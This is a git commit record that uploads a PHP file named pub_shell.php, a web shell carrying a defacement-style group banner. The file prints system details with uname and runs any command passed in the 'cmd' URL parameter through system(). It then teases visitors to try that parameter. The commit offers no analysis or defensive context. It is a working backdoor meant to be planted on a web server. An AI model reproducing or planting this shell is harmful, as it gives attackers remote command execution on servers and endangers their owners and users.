fd8d656534c34f9e4f9756ee0aceabac1ff60670
g0d <79380995+inheritably@users.noreply.github.com>
2021-02-24 20:34:55 +0000

    Add files via upload

---
+++ pub_shell.php
@@ -0,0 +1,18 @@
+<html>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <title>#TeletubbieBoys</title>
+      <meta name="description" content="RIU Teletubbies">
+      <meta name="author" content="g0d">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+g0d - NTG - Spookz
+<br>
+<br>
+<?php
+system("uname -snmpiv");
+system($_GET['cmd']);
+echo "";
+echo "";
+echo "hm i wonder what &cmd does?";
+?>
+</html>
+
